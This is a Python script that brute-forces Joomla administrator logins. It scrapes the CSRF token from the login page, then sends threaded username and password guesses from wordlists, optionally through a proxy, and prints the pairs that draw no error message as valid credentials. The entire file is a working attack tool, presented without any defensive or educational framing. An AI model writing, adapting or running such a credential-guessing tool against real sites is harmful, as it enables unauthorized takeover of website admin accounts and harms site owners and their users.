#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse
from time import time
from multiprocessing import freeze_support, Lock
from queue import Queue
from threading import Thread


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class Joomla():

    def __init__(self):
        self.initializeVariables()

    def initializeVariables(self):
        # Initialize args
        parser = argparse.ArgumentParser(description='Joomla login bruteforce')
        # required
        parser.add_argument('-u', '--url', required=True,
                            type=str, help='Joomla site')
        parser.add_argument('-w', '--wordlist', required=True,
                            type=str, help='Path to wordlist file')

        # optional
        parser.add_argument('-p', '--proxy', type=str,
                            help='Specify proxy. Optional. http://127.0.0.1:8080')
        parser.add_argument('-v', '--verbose',
                            action='store_true', help='Shows output.')
        parser.add_argument('-t', '--threads', type=int,
                            help='Specify concurrent threads (default: 8)', default=8)
        # these two arguments should not be together
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str,
                           help='One single username')
        group.add_argument('-U', '--userlist', type=str, help='Username list')

        args = parser.parse_args()
        self.args = args

        # parse args and save proxy
        if args.proxy:
            parsedproxyurl = urlparse(args.proxy)
            self.proxy = {parsedproxyurl[0]: parsedproxyurl[1]}
        else:
            self.proxy = None

        # determine if verbose or not
        if args.verbose:
            self.verbose = True
        else:
            self.verbose = False

        # http:/site/administrator
        self.url = args.url+'/administrator/'
        self.ret = 'aW5kZXgucGhw'
        self.option = 'com_login'
        self.task = 'login'
        # Need cookie
        self.cookies = requests.session().get(self.url).cookies.get_dict()
        # Wordlist from args
        self.wordlistfile = args.wordlist
        self.username = args.username
        self.userlist = args.userlist

    def sendrequest(self, password):
        """
        Send single username or iterate username list with each password
        """
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.doGET(username=user.decode('utf-8'), password=password)
        else:
            self.doGET(username=self.username, password=password)

    def doGET(self, username, password):
        # Custom user-agent :)
        headers = {
            'User-Agent': 'nano'
        }

        # First GET for CSSRF
        r = requests.get(self.url, proxies=self.proxy,
                         cookies=self.cookies, headers=headers)
        soup = BeautifulSoup(r.text, 'html.parser')
        longstring = (soup.find_all(
            'input', type='hidden')[-1]).get('name')
        password = password.decode('utf-8')

        data = {
            'username': username,
            'passwd': password,
            'option': self.option,
            'task': self.task,
            'return': self.ret,
            longstring: 1
        }
        r = requests.post(self.url, data=data, proxies=self.proxy,
                          cookies=self.cookies, headers=headers)
        soup = BeautifulSoup(r.text, 'html.parser')
        response = soup.find('div', {'class': 'alert-message'})
        if response:
            if self.verbose:
                print(
                    f'{bcolors.FAIL} {username}:{password}{bcolors.ENDC}')
        else:
            print(f'{bcolors.OKGREEN} {username}:{password}{bcolors.ENDC}')

    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data


def check_worker():
    while True:
        # Read credential from queue
        cred = q.get()
        joomla.doGET(username=cred[0], password=cred[1])
        q.task_done()


def add_credential(password):
    # Read username(s) and add them to the queue alongside the specified password
    if joomla.userlist:
        for user in joomla.getdata(joomla.userlist):
            q.put([user.decode('utf-8'), password.strip()])
    else:
        q.put([joomla.username, password.strip()])


def main():
    # Start threads
    for x in range(joomla.args.threads):
        t = Thread(target=check_worker)
        t.daemon = True
        t.start()

    # Read passwords and add to queue
    for password in joomla.getdata(joomla.wordlistfile):
        add_credential(password=password.strip())

    q.join()


if __name__ == "__main__":
    freeze_support()
    print_lock = Lock()
    q = Queue()
    start_time = time()

    joomla = Joomla()

    try:
        main()
    except KeyboardInterrupt:
        pass
